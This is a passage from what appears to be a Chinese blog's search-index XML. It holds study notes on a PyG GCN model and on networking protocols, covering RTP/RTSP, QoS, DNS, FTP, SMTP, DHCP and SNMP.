adj</span>):</span></span><br><span class="line">        support = torch.mm(<span class="built_in">input</span>, self.weight)</span><br><span class="line">        output = torch.spmm(adj, support)</span><br><span class="line">        <span class="keyword">if</span> self.bias <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> output + self.bias</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>PYG是torch_geometric，是一个python专门用于处理图数据的包，里面封装好了各种图算法，下面实现一个GCN算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch_geometric.nn <span class="keyword">import</span> GCNConv,SAGEConv,GATConv </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GCN</span>(<span class="params">torch.nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,f,h,c</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.conv1=GCNConv(f,h)</span><br><span class="line">        self.conv2=GCNConv(h,c)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self,data</span>):</span></span><br><span class="line">        x,edge_index=data.x,data.edge_index      <span class="comment">#edge_index为PYG邻接矩阵格式的数据</span></span><br><span class="line">        x=self.conv1(x,edge_index)</span><br><span class="line">        x=F.relu(x)</span><br><span class="line">        x=F.dropout(x,training=self.training)</span><br><span class="line">        x=self.conv2(x,edge_index)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>机器学习</category>
        <category>神经网络</category>
      </categories>
      <tags>
        <tag>-神经网络 -GNN</tag>
      </tags>
  </entry>
  <entry>
    <title>因特网上的音频/视频服务</title>
    <url>/2022/07/20/%E5%9B%A0%E7%89%B9%E7%BD%91%E4%B8%8A%E7%9A%84%E9%9F%B3%E9%A2%91%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="因特网上的音频-x2F-视频服务"><a href="#因特网上的音频-x2F-视频服务" class="headerlink" title="因特网上的音频&#x2F;视频服务"></a>因特网上的音频&#x2F;视频服务</h1><p>主要分为三类：</p>
<p>流式存储音频&#x2F;视频-便下载边播放</p>
<p>流式实况音频&#x2F;视频-边录制边发送</p>
<p>交互式音频&#x2F;视频-实时交互式通信</p>
<h2 id="流式存储音频-x2F-视频"><a href="#流式存储音频-x2F-视频" class="headerlink" title="流式存储音频&#x2F;视频"></a>流式存储音频&#x2F;视频</h2><p>用户从客户机的浏览器上使用HTTP协议向服务器请求下载音频&#x2F;视频</p>
<p>服务器将请求资源包装在装有用户所要的音频&#x2F;视频响应报文中传送给浏览器，浏览器接收后自己机器上的媒体播放器进行解压缩然后播放。</p>
<p><strong>元文件的万维网服务器</strong></p>
<p>描述或指名其他文件的一些重要信息。</p>
<p>流程：</p>
<p>浏览器请求万维网上超链接元文件，服务器将该元文件装入响应报文中，浏览器调用相关媒体播放器将元文件传送给媒体播放器，媒体播放器使用元文件中的URL向万维网请求下载资源，万维网将资源文件发送给媒体播放器，边下载边解压缩边播放。</p>
<p><strong>媒体服务器</strong></p>
<p>媒体播放器不是向万维网服务器请求，而是在请求元文件中URL资源时向媒体服务器请求音频&#x2F;视频文件，采用另外的协议进行交互。</p>
<p><strong>实时流式协议</strong></p>
<p>多媒体播放控制协议。从因特网上下载的实时数据进行控制。</p>
<h2 id="交互式音频-x2F-视频"><a href="#交互式音频-x2F-视频" class="headerlink" title="交互式音频&#x2F;视频"></a>交互式音频&#x2F;视频</h2><p><strong>IP电话</strong></p>
<p> 实时传输协议RTP：为实时应用提供端到端的传输，向应用层提供附加的信息。</p>
<img src="/2022/07/20/%E5%9B%A0%E7%89%B9%E7%BD%91%E4%B8%8A%E7%9A%84%E9%9F%B3%E9%A2%91%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1/image-20220804145235813.png" class title="image-20220804145235813">

<p>实时传输控制协议RTCP：对服务质量的监视与反馈、媒体间的同步记忆多播组中成员的标识。结束分组BYE，特定应用分组APP，接收端报告分组RR，发送端报告分组SR，源点描述分组SDES。</p>
<p><strong>H.323</strong></p>
<p>基于分组的多媒体通信系统。</p>
<p>H.323终端</p>
<p>网关：连接H.323网络和非.323网络进行通信</p>
<p>网闸：所有呼叫都要通过网闸，提供地址转换、授权、带宽和计费</p>
<p>多点控制单元MCU：支持更多的H.323终端的音频或视频会议。</p>
<img src="/2022/07/20/%E5%9B%A0%E7%89%B9%E7%BD%91%E4%B8%8A%E7%9A%84%E9%9F%B3%E9%A2%91%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1/image-20220804150624652.png" class title="image-20220804150624652">

<p><strong>会话发起协议SIP</strong></p>
<p>涉及IP电话的信令和有关服务质量问题，选用RTP和RTCP作为配合使用的协议。</p>
<p><strong>会话描述协议SDP</strong></p>
<p>详细指名了媒体编码、协议的端口号及多播地址。</p>
<h2 id="尽最大努力交付服务"><a href="#尽最大努力交付服务" class="headerlink" title="尽最大努力交付服务"></a>尽最大努力交付服务</h2><p>提高因特网服务质量</p>
<p><strong>调度和管制机制</strong></p>
<p>调度机制：默认排队规则是先进先出FIFO，加权公平排队WFQ</p>
<p>管制机制：平均速率，峰值速率，突发长度</p>
<p><strong>综合服务IntServ与资源预留协议RSVP</strong></p>
<p>IntServ对单个的应用会话提供服务质量的保证，资源预留和呼叫建立。有保证的服务和受控负载的服务。</p>
<p>由资源预留协议RSVP、接纳控制、分类器和调度器组成。</p>
<p><strong>区分服务DiffServ</strong></p>
<p>在路由器中增加区分服务的功能。</p>
<p>服务登记协定SLA</p>
<p>被划分为许多个DS域DiffServ</p>
<p>边界路由器中的功能</p>
<p>聚合</p>
<p>每跳行为PHB</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、多媒体主要特点：</p>
<p>信息量很大；传输多媒体数据时，对时延和时延抖动均有较高的要求；传输的是实时数据，在发送实时数据的同时在接收端边接收边播放。</p>
<p>2、缓存影响有哪些？</p>
<p>缓存使所有到达的分组经受了迟延。早到达的分组在缓存中停留的时间较长，而完到达的分组在缓存中停留时间较短。</p>
<p>3、RTSP的媒体服务器工作过程。</p>
<p>浏览器向万维网服务器请求音频&#x2F;视频文件</p>
<p>万维网服务器将带有元文件的报文发送给浏览器</p>
<p>浏览器将收到的元文件传送给媒体播放器</p>
<p>RTSP与媒体服务器的RSTP服务器建立连接</p>
<p>RTSP服务器发送响应RESPONSE报文</p>
<p>RTSP客户发送PLAY报文，开始下载</p>
<p>RTSP服务器发送响应RESPONSE报文</p>
<p>RTSP客户发送TEARDOWN报文断开连接</p>
<p>RTSP服务器发送响应RESPONSE报文</p>
<p>4、RTCP5种分组类型。</p>
<p>结束分组BYE：表示关闭一个数据流</p>
<p>特定应用分组APP：使应用程序能够定义新的分组类型</p>
<p>接收端报告分组RR：使接收端周期性地向所有点多播方式进行报告</p>
<p>发送端报告分组SR：使发送端周期性地向所有接收端用多播方式进行报告。</p>
<p>源点描述分组SDES：给出会话中参加者的描述。</p>
<p>5、IntServ定义的两类服务：</p>
<p>有保证的服务：保证一个分组在通过路由器时的排队时延有上限</p>
<p>受控负载的服务：使应用程序得到比“尽最大努力”更加可靠的服务。</p>
<p>6、IntServ的四个组成部分：</p>
<p>资源预留协议RSVP：信令协议</p>
<p>接纳控制：决定是否同意对某一资源请求</p>
<p>分类器：将进入路由器分组进行分类，根据分类结果放入不同队列。</p>
<p>调度器：根据服务质量要求决定分组发送的前后顺序。</p>
<p>7、端与端时延是指按照固定长度打包进IP分组送入网络中进行传送，接收端在收到IP包后通过解码器将其还原成模拟信号。时延抖动是指时延变化。</p>
<p>产生时延原因：IP数据包由于选择路由不同，并且不同路由器存在不同时延等原因导致同一IP数据包之间回有不同的时延，产生了抖动。</p>
<p>8、怎样使得因特网能够传送音频&#x2F;视频数据？</p>
<p>大量使用光缆，使网络的时延和时延抖动减小，使用具有大量高速缓存的高数路由器，在网上传送实时数据就不会有问题。</p>
<p>改造为能够对端到端的带宽实现预留，使用面向连接的网络</p>
<p>使得多媒体信息在因特网上的传输质量得到改进。</p>
<p>9、</p>
<p>媒体播放器主要功能：管理用户界面、解压缩、消除时延抖动和处理传输带来的差错</p>
<p>媒体服务器主要功能：使用元文件的URL接入到媒体服务器将客户端请求的音频&#x2F;视频资源返回给客户端</p>
<p>10、</p>
<p>狭义的IP电话是指在网络上打电话。</p>
<p>广义的IP电话是指不仅是IP电话，还可以在IP网络上进行交互式多媒体实时通信，包括即时IM。</p>
<p>连接方式：</p>
<p>两个PC之间通话、PC到固定用户的通话、两个固定电话之间打IP电话。</p>
<p>影响IP电话质量的主要因素：语音编码技术、分组丢包率、时延和时延抖动等。</p>
<p>标准：H.323和SIP。H.323在已有电路交换网的基础下增加IP电话的功能。SIP以因特网为基础，转换为HTTP应用作为应用。具有更好的可扩缩性。</p>
<p>11、RTP协议同时具有传输层和应用层的特点。</p>
<p>从开发者的角度看，RTP应当是应用层的一部分。在应用程序的发送端，开发者使用RTP程序代码将应用数据封装分组，将RTP分组交给UTP套接字接口发送；接收端通过对应的应用程序从分组中提取出来应用数据。由于RTP封装了多媒体应用的数据块并且向多媒体应用提供服务(时间戳和序号)。</p>
<p>序号：在一次RTP会话开始时初始序号是随机的，每次发送的分组序号加1，能让接收端发现丢失的分组和将失序的RTP分组重新排序列好。</p>
<p>时间戳：反映RTP分组中数据的第一字节的采样时刻，接收端使用时间戳准确还原哪一个数据块，从而消除时间的抖动，使视频应用中声音和图像同步</p>
<p>标记：置1表示这个RTP分组具有特殊意义。</p>
<p>12、接收端的缓存空间的上限取决于还原播放时所容许的时延。时延抖动越大，缓存空间越大。</p>
<p>13、</p>
<p>管制：控制某个数据流不影响其他正常数据流在网络中通过的机制。</p>
<p>调度：路由器的队列所采用的排队规则</p>
<p>呼叫接纳：数据流需事先声明所需要的服务质量，然后或者准许进入网络或拒绝进入。</p>
<p>14、</p>
<p>先进先出(FIFO)排队优点：实施简单  缺点：不能区分时间敏感分组和一般数据分组，对排在长分组的短分组也不公平。</p>
<p>公平排队：在高优先级队列中总有分组时，克服优先排队局限，避免低优先级队列分组长期得不到服务。缺点：长分组服务时间长，短分组得到时间短。</p>
<p>加权公平排队：为每个队列分配一个百分比权重，使得高优先级队列中的分组有更多机会得到服务。缺点：实施起来很复杂。</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -音频/视频层</tag>
      </tags>
  </entry>
  <entry>
    <title>应用层知识要点</title>
    <url>/2022/07/20/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/</url>
    <content><![CDATA[<h1 id="应用层知识要点"><a href="#应用层知识要点" class="headerlink" title="应用层知识要点"></a>应用层知识要点</h1><p>规定应用进程通信遵循规定。</p>
<h2 id="域名系统DNS"><a href="#域名系统DNS" class="headerlink" title="域名系统DNS"></a>域名系统DNS</h2><p>因特网采用层次树状结构的命名方法，任何一个连接在因特网上的主机或路由器都有其结构名称，域名。便于记忆，对IP地址进行映射。默认端口53，多数情况下为UDP进行传输。</p>
<p>结构： .三级域名.二级域名.顶级域名。</p>
<p>顶级域名：国家顶级域名(cn.us.uk)、通用顶级域名(com.net.org.edu.gov.mil.int)、基础结构域名(arpa)</p>
<p><strong>域名服务器</strong>：负责不同的区域节点。</p>
<p>根域名服务器：知道所有的顶级域名服务器的域名以及IP地址。共有13个不同的根域名服务器。</p>
<p>顶级域名服务器：管理在该顶级域名服务器注册的二级域名，在DNS查询请求时给出相应映射。</p>
<p>权限域名服务器：负责一个区域范围内的域名服务器。</p>
<p>本地域名服务器：主机发出DNS请求时，会首先到本地域名服务器去查询。</p>
<p>域名解析过程：(递归+迭代)</p>
<p>1.用户在浏览器上输入指定域名(<a href="http://www.sina.com),首先会在浏览器自身缓存中检测是否有对应的映射/">www.sina.com)，首先会在浏览器自身缓存中检测是否有对应的映射</a></p>
<p>2.若未命中，则检测主机系统中的缓存(hosts文件)，查询域名对应的IP地址。</p>
<p>3.若未命中，才会去请求本地域名服务器进行解析域名。</p>
<p>4.若未命中，则请求根域名服务器返回主域名服务器地址。本地域名服务器对主域名服务器地址发出请求，主域名服务器返回查询的域名服务器地址，本地域名服务器向该域名服务器发出请求，返回IP地址和域名的映射关系。</p>
<p>5.本地域名服务器缓存该映射并将其发送给主机，主机保存在缓存中并进行域名解析。</p>
<p>注：本地域名服务器替主机向根域名服务器查询是递归查询，本地域名服务器向根域名服务器是迭代查询。</p>
<p>高速缓存：提高DNS查询效率，减轻根域名服务器负荷和减少在因特网上的DNS查询报文。记录最近查询过的域名。</p>
<h2 id="文件传送协议"><a href="#文件传送协议" class="headerlink" title="文件传送协议"></a>文件传送协议</h2><p>文件共享协议分为文件传送协议和联机访问(NFS)</p>
<p>文件传送协议是复制整个文件，获取文件副本，若修改后将其副本传回源节点</p>
<p>联机访问：对远程主机共享文件的访问，直接对该文件进行操作。</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>在不同操作系统中传输文件，使用TCP可靠传输服务，减少或消除在不同操作系统中处理文件的不兼容性。</p>
<p>使用客户-服务器方式，一个服务器进程为多个客户进程提供服务。分为主进程和从属进程(控制和数据传送)，主进程负责接受新请求，从属进程负责单个请求。</p>
<p>默认端口20&#x2F;21，端口21为实现控制连接，端口20为数据传输。</p>
<p><strong>工作流程</strong></p>
<img src="/2022/07/20/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731163215032.png" class title="image-20220731163215032">

<p>FTP服务器首先开放21端口等待客户端连接，客户端与其建立一个与FTP服务器21端口之间的TCP连接，并使用令牌登录进行认证。</p>
<p>客户端认证成功后，通过控制连接发送命令对文件进行操作。服务器接收到该传输命令后通过端口20与客户端创建一个TCP连接传输文件，反复如此。</p>
<p><strong>涉及情况：</strong>当客户只对服务器上文件进行添加少数数据，使用FTP并不是最佳的，由于没有使用该文件内容，来回传送文件花费很大时间。使用NFS打开远地文件，在文件某位置开始添加数据，无需复制整个文件，只需将修改和数据传送给服务器即可。</p>
<p>特点：</p>
<p>提供交互式访问使得协议更加简单实现和更好控制连接；基于CS模式面向连接，使用TCP可靠运输服务；减少不同操作系统文件的不兼容性。</p>
<h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a><strong>TFTP</strong></h3><p>客户端熟知端口号69，发送读请求报文或写请求报文给服务器。</p>
<p>优点：基于CS模式，使用UDP数据包；只支持文件传输不支持交互，TFTP代码占内存小。</p>
<p>特点：</p>
<p>每次传送数据PDU有512字节数据</p>
<p>每个数据块从编号1开始</p>
<p>支持ASCLL码或二进制传送</p>
<p>仅对文件机进行读或写</p>
<p>工作与停止等待协议相同</p>
<h2 id="远程终端协议-TELNET"><a href="#远程终端协议-TELNET" class="headerlink" title="远程终端协议(TELNET)"></a>远程终端协议(TELNET)</h2><p>通过TCP连接到另一个主机，将用户的击键命令转换为<strong>NVT</strong>格式进行传输并返回执行数据。默认熟知端口为23.</p>
<p><strong>NVT(网络虚拟终端)</strong>:使用8位一个字节，在运转时使用7位ASCLL码传送数据，高位置为1时用作控制命令。如CR-LF回车换行符作为行结束控制符。</p>
<h2 id="万维网-WWW"><a href="#万维网-WWW" class="headerlink" title="万维网(WWW)"></a>万维网(WWW)</h2><p>客户向服务器程序发出请求，服务器返回客户需要的万维网文档。</p>
<p>万维网使用链接从一个站点访问到另一个站点，超文本是万维网的基础。</p>
<p>解决问题：</p>
<p>1、标志分布整个因特网上的万维网文档？</p>
<p>每一个文档在整个因特网的范围内具有唯一的标识符URL，用统一资源定位符URL来标识万维网上的各种文档。</p>
<p>2、实现万维网上超链接？</p>
<p>使用超文本协议HTTP进行传输，HTTPS协议使用证书验证。</p>
<p>3、如何使各种万维网文档在计算机上显示出来？</p>
<p>使用超文本标记语言html使得万维网中某页面的某处链接到任何一个万维网页面。</p>
<p>4、如何方便的找到所需的信息、</p>
<p>使用各种搜索引擎工具。</p>
<p><strong>统一资源定位符(URL)：</strong>对因特网上资源的位置和访问方法的表示。</p>
<p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;主机&gt;:&lt;端口&gt;&#x2F;&lt;路径&gt;</p>
<p><strong>HTTP</strong></p>
<p>定义万维网客户端向万维网服务器请求万维网文档，以及服务器如何返回文档给客户端。</p>
<p>HTTP本身是无连接的，在TCP连接建立后直接传送HTTP报文；HTTP是无状态的支持大量并发HTTP请求；</p>
<p>HTTP&#x2F;1.1持续连接方式：非流水线方式(客户收到响应后发送请求)和流水线方式(一个接一个请求)</p>
<p><strong>CGI</strong>：通用网关接口。定义动态文档如何创建，输入数据应如何提供给应用程序以及输出程序应如何使用。</p>
<p><strong>信息检索系统</strong></p>
<p>全文搜索引擎：通过爬虫在因特网的各网站上收集信息，按照一定的规则建立数据库。根据用户查询条件匹配的相关记录在数据库中进行查询获取相关页面。谷歌、百度。</p>
<p>分类目录搜索：利用各网站向搜索引擎提交的网站关键信息将符合网站信息的网页输入到对应目录的数据库中。分类目录查询结果不是具体页面，是被收录网站主页的URL网址。如雅虎、新浪、搜狐、网易等</p>
<p>博客倾向于表达，微博倾向于社交，轻博则是结合两者。</p>
<h2 id="电子邮件协议"><a href="#电子邮件协议" class="headerlink" title="电子邮件协议"></a>电子邮件协议</h2><p>格式：收信人邮箱名@邮箱所在主机域名</p>
<p>收信人邮箱名：用户自定义的字符串标识符，在邮箱所在计算机中必须唯一存在的。</p>
<p>邮箱所在主机域名：因特网唯一存在的</p>
<p>发送邮件协议：SMTP</p>
<p>读取邮件协议：POP3和IMAP</p>
<p><strong>简单邮件传送协议(SMTP)</strong></p>
<p>规定两个SMTP进程之间进行交换信息。MIME通用因特网邮件扩充指定邮件的数据类型。</p>
<p>通信过程：</p>
<p>连接建立阶段：</p>
<p>1.用户代理将邮件发送到邮件服务器的邮件缓存，当SMTP客户端每隔一定时间对邮件缓存扫描一次，如发现有邮件，就使用SMTP的熟知端口号25与接收方的邮件服务器的SMTP服务器建立TCP连接。</p>
<p>2.接收方SMTP服务器发出“220 Service ready”告诉客户端它已经准备好接收邮件。若服务器未就绪，它就发送代码421（服务器不可用）。</p>
<p>3.客户发送HELO报文，并使用它的域名地址标志自己。目的是：用来把客户的域名通知服务器，值得注意的是， 在TCP的连接建立阶段，发送方和接收方都是通过它们的IP地址来告诉对方的 。（HELO报文是最初的，用户名和密码都不加密。现在改为EHLO，用户名和密码都进行base64编码发送）</p>
<p>4.服务器响应代码250（请求命令完成）或根据情况的其他一些代码。</p>
<p>传送阶段：</p>
<p> 在SMTP客户与服务器之间建立连接后，发件人就可以与一个或多个收件人交换单个的报文了。若收件人超过一个，则下面步骤3和步骤4将重复进行。</p>
<p>​    1.客户发送MAIL FROM报文介绍报文的发送者。它包括发送人的邮件地址（邮箱名和域名，如house@qq）。这个步骤是必要的：因为可以给服务器在返回差错或报文时的返回邮件地址 。</p>
<p>​    2.服务器响应代码250（请求命令完成）或其他适当的代码451、452、500。</p>
<p>​    3.客户发送RCPT（收件人）报文，包括收件人的邮件地址，RCPT命令的作用是 ： 先弄清接收方系统是否已经准备好接收邮件的准备，然后才发送邮件，这样做视为了避免浪费通信资源，不至于发送了很长的邮件以后才知道是因地址错误 。</p>
<p>​    4.服务器响应代码250或其他适当的代码。</p>
<p>​    5.客户发送DATA报文对报文的传送进行初始化，DATA命令表示要开始传送邮件的内容了。</p>
<p>​    6.服务器响应代码”354 Start mail input: end with <CRLF>.<CRLF>“或其他适当的报文（如421 服务器不可用，500 命令无法识别）。</CRLF></CRLF></p>
<p>​    7.客户用连续的行发送报文的内容。每一行的行结束时输入 <CRLF>.<CRLF> ，即回车换行.回车换行，表示邮件内容结束。</CRLF></CRLF></p>
<p>​    8.服务器响应代码（250 请求命令完成）或其他适当的代码。</p>
<p>连接释放。发送完后释放TCP连接。</p>
<p>连接释放阶段：</p>
<p>在报文传送成功后，客户就终止连接。包括如下步骤：</p>
<p>​    1.客户发送QUIT命令。</p>
<p>​    2.服务器响应221（服务关闭）或其他代码。</p>
<p>​    在连接终止阶段后，TCP连接必须关闭。</p>
<p><strong>邮件读取协议</strong></p>
<p>POP3协议中用户所连接的ISP邮件服务器则运行POP服务器程序，访问邮件服务器下载后才来访问缓存的邮件，读取后删除该邮件。</p>
<p>IMAP4协议需要登录服务器邮箱才能接收邮箱，未发出删除命令时一直保留在服务器。</p>
<img src="/2022/07/20/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731200131202.png" class title="image-20220731200131202">

<p><strong>基于万维网的电子邮件</strong></p>
<p>用户代理为浏览器，在发送邮件到邮件服务器时和从邮件服务器接收邮件时使用HTTP，两个邮件服务器之间使用SMTP。</p>
<p>如：网易(163)、新浪(sina)、谷歌Gamil</p>
<p><strong>MIME</strong>(通用因特网邮件扩充)</p>
<p>SMTP不能传送可执行文件或其他二进制对象。将非ASCLL码数据转换为NVT ASCLL数据再交给SMTP进程进行传送</p>
<img src="/2022/07/20/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731203204837.png" class title="image-20220731203204837">



<h2 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议(DHCP)"></a><strong>动态主机配置协议(DHCP)</strong></h2><p>自动为主机分配IP地址信息。端口号为67(接收消息)，68(发送消息)。</p>
<p>每一个网络设置DHCP中继代理，收到主机广播的发现报文后单播中继给DHCP服务器。</p>
<img src="/2022/07/20/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220801094735745.png" class title="image-20220801094735745">



<p>工作流程：</p>
<p>1、主机发现没有设置任何IP地址，通过UDP端口68以广播的方式发送DHCP Discover寻找DHCP服务器，等待时间预设为1s，若没有收到DHCP服务器的回应，则从169.254.0.0&#x2F;16选用地址，每隔5分钟重新广播一次。</p>
<p>2、DHCP服务器收到客户端发起的DHCP dIscover广播后，把那些没租出去的地址选择空置IP，通过UDP 68端口返回给客户端一个DHCP offer数据包(IP地址、子网掩码、地址租期等信息)。以广播的方式(源IP为DHCP服务器，目的IP为255.255.255.255，目的MAC地址为客户端地址)</p>
<p>3、广播内的所有主机接收到这个报文后，判断目的MAC地址是否为自己的MAC地址，只有符合的才接收该报文。当客户端收到多台服务器的响应，则一般选择最先到达的。然后以广播的形式发送DHCP Request包(MAC地址、接收的IP地址，DHCP服务器地址)，告诉所有DHCP服务器自己接收哪台DHCP服务器的分配。</p>
<p>4、当目标DHCP服务器接收到DHCP request包后，广播返回一个DHCP ack包(IP地址、租约等配置信息，客户端MAC地址)表示接收请求。</p>
<p>5、当客户端接收到DHCP ack广播后，会向网络中发送此IP地址的三次ARP进行冲突检测分配的IP地址是否已被使用。若已使用则向服务器发送DHCP decline数据包拒绝此IP地址租约，并重新发送DHCP Discover报文给服务器；否则就使用该分配IP地址。</p>
<p><strong>续租情况</strong>：</p>
<p>当租用期过一半时，客户端向服务器发送DHCP REQUEST要求更新租用期，若服务器响应该请求(同意则返回确定DHCP ACK报文更新租用期；否则返回DHCPNACK停止使用IP地址，重新申请IP地址)，否则当租用期超过87.5%时，客户端重新发送DHCP REQUEST请求。</p>
<p>DHCP客户随时提前终止服务器提供的租用期，向服务器发送DHCP REALSE报文。</p>
<h2 id="简单网络管理协议SNMP"><a href="#简单网络管理协议SNMP" class="headerlink" title="简单网络管理协议SNMP"></a>简单网络管理协议SNMP</h2><p>SNMP协议就是管理程序和代理程序按CS方式工作通信协议。管理程序运行SNMP客户端，代理程序运行SNMP服务端。</p>
<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><p><strong>网络管理模型主要构件：</strong></p>
<p> 管理站：所在部门网络允许中心NOC，整个网络管理系统的核心，控制所有被管设备。关键构件是管理程序&#x2F;进程。</p>
<p>被管设备：主机、路由器、打印机等。每一个被管设备又许多被管对象(网络元素)</p>
<p>网络管理代理程序：被管设备与管理站之间的通信进程。</p>
<p><strong>SNMP网络管理组成：</strong></p>
<p>SMI定义规则，MIB对变量进行说明，SNMP完成网关动作。</p>
<p>SNMP本身：定义管理站和代理之间所交换的分组格式</p>
<p>管理信息结构SMI：定义命名对象和定义对象类型的通用规则。</p>
<p>管理信息库MIB：在被管理实体中创建命名对象，并规定其类型。</p>
<p>SNMP按照SMI定义的规则，存储、改变和解释MIB说明的对象值。</p>
<h3 id="管理信息结构-SMI"><a href="#管理信息结构-SMI" class="headerlink" title="管理信息结构(SMI)"></a>管理信息结构(SMI)</h3><ul>
<li>被管对象应如何命名</li>
<li>用来存储被管对象的数据类型有哪些</li>
<li>在网络上传送的管理数据应如何编码</li>
</ul>
<p>管理对象使用对象命名树。</p>
<p>使用基本的抽象语法记法1来定义数据类型，增加一些新定义。分为简单类型和结构化类型(sequence和sequence of)</p>
<p>使用基本编码规则BER进行数据编码。</p>
<h3 id="管理信息库-MIB"><a href="#管理信息库-MIB" class="headerlink" title="管理信息库(MIB)"></a>管理信息库(MIB)</h3><p>被管对象可供管理程序读写的控制和状态信息构成的信息存储器。</p>
<h3 id="SNMP协议数据单元和报文"><a href="#SNMP协议数据单元和报文" class="headerlink" title="SNMP协议数据单元和报文"></a>SNMP协议数据单元和报文</h3><p>两种基本管理功能：读和写</p>
<ul>
<li>读：用Get报文检测各被管对象的状态</li>
<li>写：用Set报文来改变被管对象的状态</li>
</ul>
<h2 id="应用进程跨越网络通信"><a href="#应用进程跨越网络通信" class="headerlink" title="应用进程跨越网络通信"></a>应用进程跨越网络通信</h2><p><strong>系统调用</strong>：在应用程序和操作系统之间传递控制权。通过应用编程接口(api)定义标准函数得到操作系统服务。</p>
<p>可供TCP&#x2F;ip使用的接口API：套接字接口、Winodws Socket、TLI。</p>
<p>当应用进程需要使用网络进行通信时，首先发出Socket系统调用，请求操作系统创建套接字为其分配系统资源(存储器空间、CPU时间、网络带宽等)，这些系统资源称为套接字描述符。</p>
<p><strong>常用系统调用</strong></p>
<p>连接建立阶段：客户端调用bind绑定本机地址和端口号和connect与远地服务器建立连接，服务端除了bind还需调用listen接受客户请求和调用accept创建从属服务器使用新套接字与客户连接。</p>
<p>数据传送阶段：客户和服务器调用send接口发送数据，调用recv接口接受数据。</p>
<p>连接释放阶段：客户和服务器调用close接口释放连接和撤销套接字。</p>
<h2 id="主要题型"><a href="#主要题型" class="headerlink" title="主要题型"></a>主要题型</h2><p>1、为了使服务器能够响应并发出请求，在服务器实现中通常采取重复服务器方案和并发服务器方案。</p>
<p>2、TCP&#x2F;IP上进行域名解析分为递归解析和迭代解析。</p>
<p>3、保证高速缓冲区中域名-IP地址映射关系有效性：</p>
<p>解析器报告缓冲信息时注明“非权威性”</p>
<p>对高速缓冲区的每一个映射关系指定最大生存周期</p>
<p>4、FTAM是一个用于传输、访问和管理开放系统中文件的信息标准</p>
<p>5、局域网从介质访问控制协议角度划分为共享局域网和介质交换局域网。</p>
<p>6、网络运行中心对网络及其设备管理的三种方式是基于SNMP的代理&#x2F;服务器方式、本地终端方式和telnet命令。</p>
<p>7、博客是Blog、微博是Microblog、轻博是Light Blogging。</p>
<p>8、解析器是用于查询DNS服务器将主机名称解析为IP地址</p>
<p>9、提供一台备份服务器，以防主名称服务器失效，提供了在和平衡降低主名称服务器上的载荷量。</p>
<p>10、FTP和TFTP服务区别。</p>
<p>FTP是一个面向会话的文件传输协议，在建立连接之前需要进行用户确认。</p>
<p>TFTP是一个简单的复制文件使用程序，来回复制远程计算机的文件，不提供任何用户身份确认。</p>
<p>11、管理信息库(MIB)是代表某个设备或服务的一套可管理对象的数据库。在SNMP中，每台主机的MIB必须使用精确的组织结构定义可管理对象。</p>
<p>12、虚拟终端NVT：在客户端和服务端之间建立数据表示和解释进行传送。8bit数据，7位数据加上1位标志组成，当标志位为1时表示为NVT命令。</p>
<p>13、 </p>
<p>电子邮件系统组成部分：用户代理、邮件服务器以及使用协议。</p>
<p>UA是指用户与电子邮件系统的接口。用户通过用户代理接收和发送邮件到邮件服务器。由于某些计算机没有足够的存储器来允许邮件服务器程序在后台运行或者没有足够的CPU能力来运行邮件服务器程序。让用户的PC运行邮件服务器程序显然很不现实。</p>
<p>14、</p>
<p>域名结构：由标号序列组成，各标号之间用点隔开：…三级域名.二级域名.顶级域名</p>
<p>电话号码：国家号(中国 +86)、区号、本机号。</p>
<p>15、</p>
<p>quoted-printable编码适用于所有可打印的ASCLL码，除”&#x3D;&#x3D;”外。</p>
<p>Base64编码适用于任意的二进制文件。将二进制代码划分为24bit长的单元，将每一个24bit单元划分为4个6bit组，每一个6bit组按照一定方法转换为ASCLL码。</p>
<p>Base64增加了开销，当传送数据大部分为ASCLL码时，最好采用quote-printable编码。</p>
<p>16、</p>
<p>网络元素：网络中的被管设备，网元。</p>
<p>被管对象：网络元素中设备的硬件和软件部分</p>
<p>管理信息库：网络中所有被管对象集合的数据结构</p>
<p>管理进程：管理站中管理程序运行会创建多个管理进程</p>
<p>代理进程：被管设备中都要运行网络管理</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Transformer和视觉Transformer的注意力机制</title>
